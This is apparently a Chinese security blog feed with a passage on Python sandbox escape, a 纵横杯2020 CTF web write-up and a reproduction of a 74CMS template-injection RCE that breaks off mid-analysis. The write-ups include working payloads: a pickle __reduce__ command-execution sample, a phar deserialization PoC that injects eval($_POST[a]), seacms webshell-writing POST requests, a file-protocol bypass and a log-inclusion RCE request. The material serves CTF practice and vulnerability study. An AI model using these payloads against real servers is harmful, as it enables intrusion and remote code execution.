src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163756.png" alt=""></p><p>发现把os从<code>modules</code>中删去就不能直接引入了。但是，我们可以接着设置<code>os</code>的模块的路径，从而引入该模块：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164329.png" alt=""></p><p>另外，我们将 sys.modules 中的os 删除即可，这样import 发现 sys.modules没有os这个模块，就会重新创建。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164528.png" alt=""></p><h2 id="0x03-执行代码和命令">0x03 执行代码和命令</h2><h3 id="动态执行代码">动态执行代码</h3><p>(1) eval/exec/execfile</p><p>在上文中，已经讲解了exec/execfile的用法。这里再总结一下：</p><ul><li>exec(source)：动态执行复杂的python代码，函数的返回值永远为None。</li><li>execfile(filename)：执行一个py文件的内容。</li></ul><p>eval用来执行简单的python表达式返回表达式的结果，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(2) pickle 序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span>    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span>        </span><br><span class="line">    <span class="keyword">import</span> os        </span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">  admin = A()</span><br><span class="line">  B = pickle.dumps(admin)</span><br><span class="line">  print(pickle.dumps(admin))</span><br><span class="line"><span class="comment"># cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.</span></span><br></pre></td></tr></table></figure><p>保存序列化之后的字符串，然后通过pickle.loads加载即可完成代码的执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.loads(<span class="string">&quot;cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.&quot;</span>)</span><br></pre></td></tr></table></figure><p>(3) timeit 这个模块是用来测试代码的执行时间的，可以动态执行代码，代码是字符串形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="执行命令">执行命令</h3><p>(1) os模块</p><p>可以通过os.system(cmd),os.popen(cmd)调用系统命令，例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(2) commands 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line">print(commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br></pre></td></tr></table></figure><p>(3) subprocess模块</p><p>subprocess模块是相对比较复杂的，有很多执行命令的函数：</p><ul><li>subprocess.run() Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</li><li>subprocess.call() 执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</li><li>subprocess.check_call() Python 2.5中新增的函数。执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。</li><li>subprocess.check_output() Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</li><li>subprocess.getoutput(cmd) 接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</li><li>subprocess.getstatusoutput(cmd) 执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</li></ul><p>(4) platform 模块</p><p>可以调用platform 模块 中的 popen 这个函数执行命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">print(platform.popen(<span class="string">&#x27;ls&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,bufsize= <span class="number">-1</span>).read())</span><br><span class="line">platform.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>(5) pty 模块</p><p>pty模块可以生成一个伪终端，可以简单理解为bash，因此是可以执行命令的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ptypty.spawn(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>(6) cgi 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line">cgi.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-文件读取">0x04 文件读取</h2><h3 id="初阶-v2">初阶</h3><p>(1)open（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(__file__).read()</span><br></pre></td></tr></table></figure><p>(2)file（python2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(__file__).read()</span><br></pre></td></tr></table></figure><h3 id="高阶-v2">高阶</h3><p>(1)codecs模块（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(__file__).read()</span><br></pre></td></tr></table></figure><p>(2)types模块（python2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line">types.FileType(__file__,<span class="string">&#x27;r&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>(3)os.open（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fd = os.open(__file__, os.O_RDONLY)</span><br><span class="line">print(os.read(fd, <span class="number">1024</span>))</span><br></pre></td></tr></table></figure><p>(4)file协议</p><p>python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = urllib.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = urllib.request.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br><span class="line">print(u.read())</span><br></pre></td></tr></table></figure><p>(5)fileinput模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">with</span> fileinput.input(files=(__file__,)) <span class="keyword">as</span> f:</span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    print(line)</span><br></pre></td></tr></table></figure><h2 id="0x05-内建模块">0x05 内建模块</h2><p>如果沙箱不让我们导入外部模块，或者是要导入的模块被禁用，那我们只能求助于Python的内部模块<code>__builtins__</code>( 即Python 本身默认已经导入模块中的函数)。</p><p>dir内置函数可以列出一个模块/类/对象下面所有的属性和函数，查看一下<code>__builtins__</code>中的函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171409.png" alt=""></p><p>例如，我们可以引用<code>__import__ </code>来导入os，并执行命令：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171530.png" alt=""></p><p>由于内置模块中的危险函数过多，比如eval,exec等，导致上文使用的沙箱对**<strong>***<em>builtins*</em></strong>****进行了处理，通过 del 关键字将里面的所有函数引用都删除了。</p><p>如果保留reload内置函数，我们还可以通过<code> reload( __builtins__)</code> 恢复，但是现在通过<code>__builtins__</code>来进行逃逸已经不现实了。</p><h2 id="0x06-对象创建与引用">0x06 对象创建与引用</h2><p>删除的是只是函数引用，而不是函数本身，如果你们熟悉C语言的话，函数引用可以理解为函数指针，既然<code>__builtins__</code>中的引用没了，那我们就需要从<strong>其他地方找到敏感函数的引用</strong>，从而实现逃逸。</p><p>关于这一块的内容，其实和flask SSTI的内容是一样的，也是通过python的内置类型的继承链来寻找更多的引用，以下字段是寻找继承链的关键：</p><table><thead><tr><th>名称</th><th>介绍</th></tr></thead><tbody><tr><td><code>__dict__</code></td><td>这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性</td></tr><tr><td><code>__class__</code></td><td>返回一个实例对应的类型</td></tr><tr><td><code>__base__</code></td><td>返回一个类所继承的基类</td></tr><tr><td><code>__subclasses__()</code></td><td>返回该类的所有子类</td></tr><tr><td><code>__mro__</code></td><td>python支持多重继承，在解析<code>__init__</code>时，定义解析顺序的是子类的<code>__mro__</code>属性（值是类的元组）</td></tr><tr><td><code>__slots__</code></td><td>限制类动态添加属性</td></tr><tr><td><code>__getattribute__()</code></td><td>获取属性或方法，对模块和类都有效</td></tr><tr><td><code>__getitem__()</code></td><td>以索引取值或者键取值</td></tr><tr><td><code>__globals__</code></td><td>返回函数所在模块命名空间中的所有变量</td></tr></tbody></table><p>其他的具体内容参考flask SSTI即可。</p><h2 id="0x07-Reference">0x07 Reference</h2><p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p><p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p><p><a href="https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg">https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Python沙箱逃逸&quot;&gt;Python沙箱逃逸&lt;/h1&gt;
&lt;p&gt;上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="沙箱逃逸" scheme="http://ca0y1h.top/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>纵横杯2020-Web-WriteUp</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp/</id>
    <published>2020-12-28T14:09:46.000Z</published>
    <updated>2020-12-28T14:11:09.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="纵横杯2020-Web-WriteUp">纵横杯2020 Web WriteUp</h1><p>题目源码：</p><p>链接: <a href="https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A">https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A</a>  密码: dmqt</p><h2 id="0x01-easycl">0x01 easycl</h2><p>打开题目直接进入登录界面，有admin用户存在，弱密码无效。根据Wappalyzer提示，题目站点使用了CodeIgniter框架，通过比对题目环境的URL和CodeIgniter的三个大版本的源码，猜测应该用的是CodeIgniter4.0。前台登录有盲注存在：      可以用SQLMAP跑出数据库信息，但是进入后台没有什么用。再使用SQLMAP获取sql-shell，可以读取部分文件：        <img src="https://uploader.shimo.im/f/yKNJ4TwZFR1VppPL.png!thumbnail" alt="img">      这道题坑的地方就在于网站根目录不在/var/www/下，通过读取 /etc/apache2/sites-enabled/000-default.conf得到网站根目录/var/sercet/html再用SQL拿到os-shell，搜索flag文件        <img src="https://uploader.shimo.im/f/YEqWl1M66valOfP6.png!thumbnail" alt="img">      读取flag文件        <img src="https://uploader.shimo.im/f/D4FIVx50ohQWkJ4c.png!thumbnail" alt="img"></p><h2 id="0x02-easycms">0x02 easycms</h2><p>www.zip 可以下载源码查看配置文件/common/config/config.php        <img src="https://uploader.shimo.im/f/kNIkXOn14JxnvHhs.png!thumbnail" alt="img">      用admin和admin868可以成功登陆网站后台。<a href="https://www.freebuf.com/vuls/248912.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%90%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AASSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E5%AF%B9%E6%AF%94%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%A2%98%E7%9B%AE%E6%8A%8A%E6%BC%8F%E6%B4%9E%E6%8D%A2%E6%88%90%E4%BA%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%EF%BC%9A/core/class/collection.class.php">https://www.freebuf.com/vuls/248912.html这篇文章中提到了一个SSRF漏洞，代码进行对比之后，发现题目把漏洞换成了任意文件读取，文件位置：/core/class/collection.class.php</a>        <img src="https://uploader.shimo.im/f/RSvH1VN5mYRXhU0i.png!thumbnail" alt="img"></p><p>然后打比赛的时候就一直卡在这，现在想想真的是蠢，忘了去看yzmcms的官方issues，我说怎么这么多人做出来了。</p><p>照着这个复现一下就可以打过去：<a href="https://github.com/yzmcms/yzmcms/issues/53">https://github.com/yzmcms/yzmcms/issues/53</a></p><p>找到了洞不知道怎么利用，真的是有够菜的，还是来看看原理。</p><p>当时最大的问题就是不能回显，当时我直接在网址配置中用file协议读文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153535.png" alt=""></p><p>提交之后，点击测试采集，在phpstorm打断点调试，在运行到100行的时候，content中的内容是/etc/passwd的文件内容。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153848.png" alt=""></p><p>但是在调用get_sub_content函数之后，content的值会被改变，我们跟进这个函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228154259.png" alt=""></p><p>这个函数用了两次explode函数把content分割成一个数组，然后返回一个冒号。既然这样，我们知道flag的格式是<code>flag&#123;&#125;</code>那么把<code>start</code>改成<code>f</code>，把<code>end</code>改成<code>&#125;</code>，再经过这个函数处理后就可以保留关键的地方：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201139.png" alt=""></p><p>但是问题又来了，content的内容还要经过get_all_url函数的处理，继续跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201349.png" alt=""></p><p>第65行preg_match_all函数提取a标签中的内容，并且在下面的foreach循环中，会接着提取href元素内容，既然如此，那么我们就把要读取的文件写在a标签的href元素中作为链接，然后封装在一个HTML文件中。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure><p>模块采集配置：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204207.png" alt=""></p><p>跟进函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203235.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203432.png" alt=""></p><p>但是在第83行还要经过url_check函数的检查，跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203622.png" alt=""></p><p>这个函数内部规定了只允许HTTP或HTTPS协议，于是我们用file协议会直接报错。但这种检查前四个字符的方式未免有些简单粗暴，可以使用一个PHP特性绕过：</p><blockquote><p>When PHP encounters an unknown protocol, it will throw a warning and set the protocol to null. When the Protoco is null or file, the local operation will be carried out. By default, the local file operation will be performed if the protocol is not transferred or the protocol does not exist.</p></blockquote><p>简单来说就是：当PHP遇到一个不存在的协议的时候，会把协议置空，并且当协议为空或者不存在时，会当做文件操作，即file协议。</p><p>既然这样，那我们最后的payload就是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;httpxxx:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure><p>最后成功返回到content参数中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204406.png" alt=""></p><p>虽然有个warning，但是文件还是读出来了：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204838.png" alt=""></p><h2 id="0x03-hellophp">0x03 hellophp</h2><p>这题也挺简单的，时间都花在上面那道题目了，真的是亏死。。</p><p>重点审计class.php这个文件，应该可以很明显的发现有反序列化的漏洞：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228205833.png" alt=""></p><p>其中tile和comment都是可以控制的，那么利用其中一个变量即可。</p><p>接着需要寻找反序列化的触发点，全局搜索没有unserialize函数后，可以很快的发现admin.php有文件上传功能，那么肯定是要上传phar压缩包触发反序列化，再找文件操作的相关函数，在index.php中有file_exist函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228210143.png" alt=""></p><p>把phar压缩包的路径传入img参数即可触发反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line">    <span class="keyword">public</span> $comment;</span><br><span class="line">    <span class="keyword">public</span> $logo_url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$title, $comment</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title = $title;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;comment = $comment;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$title = <span class="string">&quot;1&#x27;.eval(\$_POST[a]).&#x27;a&quot;</span>;</span><br><span class="line">$comment = <span class="number">456</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line"><span class="comment">//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$A = <span class="keyword">new</span> Config($title, $comment);</span><br><span class="line">$phar-&gt;setMetadata($A);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h2 id="0x04-大家一起来审代码">0x04 大家一起来审代码</h2><p>看到这种量级的代码，出题人一般都是拿别市面上的CMS，这个时候就可以先找配置文件看看，在data/common.inc.php文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228213535.png" alt=""></p><p>有两个信息：第一出题人用的是seacms，第二数据库的用户名和密码是admin,admin，这个也是本网站的后台密码。</p><p>既然是seacms，那我们就充分发挥Google的作用：<a href="https://lhlh22.github.io/2020/10/22/Seacms-v10-1-%E5%90%8E%E5%8F%B0getshell/#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%EF%BC%89">https://lhlh22.github.io/2020/10/22/Seacms-v10-1-后台getshell/#后台命令执行（三）</a></p><p>这篇文章提到了admin_notify.php文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228214002.png" alt=""></p><p>过滤掉了括号和反引号，那么我们就可以直接<code>include &quot;/flag&quot;;</code>即可，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;adm1n&#x2F;admin_notify.php?action&#x3D;set</span><br><span class="line">POST: notify1&#x3D;&quot;;include &quot;&#x2F;flag&quot;;&#x2F;&#x2F;&amp;notify2&#x3D;2&amp;notify3&#x3D;3</span><br></pre></td></tr></table></figure><p>再访问<code>/data/admin/notify.php</code></p><p>除此之外，<code>adm1n/admin_ip.php</code>也可以写入webshell：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228215247.png" alt=""></p><p>不知道这个preg_match有啥用。。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: v&#x3D;&quot;;eval($_POST[1]);&#x2F;&#x2F;&amp;ip&#x3D;1.1.1.1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;纵横杯2020-Web-WriteUp&quot;&gt;纵横杯2020 Web WriteUp&lt;/h1&gt;
&lt;p&gt;题目源码：&lt;/p&gt;
&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A&quot;&gt;https://
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>骑士CMS模板注入+文件包含getshell复现</title>
    <link href="http://ca0y1h.top/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-19T13:23:50.000Z</published>
    <updated>2020-12-19T13:24:50.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="骑士CMS模板注入-日志包含RCE复现">骑士CMS模板注入+日志包含RCE复现</h1><p>本文参考自TimeLine Sec团队成员microworld的复现记录。</p><h2 id="0x01-漏洞概述">0x01 漏洞概述</h2><p><a href="http://www.74cms.com/news/show-2497.html">http://www.74cms.com/news/show-2497.html</a></p><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p><h2 id="0x02-影响版本">0x02 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p><h2 id="0x03-环境搭建">0x03 环境搭建</h2><p>从官网下载6.0.20版本源代码</p><p><a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p><p>新建数据库，用MAMP Pro搭建站点</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201214210511.png" alt=""></p><h2 id="0x04-漏洞复现">0x04 漏洞复现</h2><p>发送如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;</span><br><span class="line">1</span><br><span class="line">&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215153839.png" alt=""></p><ol start="2"><li>查看站点日志，文件位于<code>/data/Runtime/Logs/home/20_12_15.log</code></li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154016.png" alt=""></p><ol start="3"><li>包含日志</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154208.png" alt=""></p><h2 id="0x05-漏洞分析">0x05 漏洞分析</h2><p>在正式分析漏洞之前，先看一看74CMS的路由和日志记录。</p><p>由于74CMS是基于ThinkPHP 3.2.3，其标准的URL路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作</span><br></pre></td></tr></table></figure><p>但是74CMS采用的是普通模式，使用传统的GET传参来指定当前访问的模块、控制器和方法，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;?m&#x3D;模块&amp;c&#x3D;控制器&amp;a&#x3D;方法&amp;var&#x3D;参数</span><br></pre></td></tr></table></figure><p>当然这些参数也是可以自定义的，配置文件位于<code>ThinkPHP/Conf/convention.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154751.png" alt=""></p><p>其次，ThinkPHP定义了日志记录的方式，在<code>ThinkPHP/Library/Think/Log.class.php</code>中的write方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215155115.png" 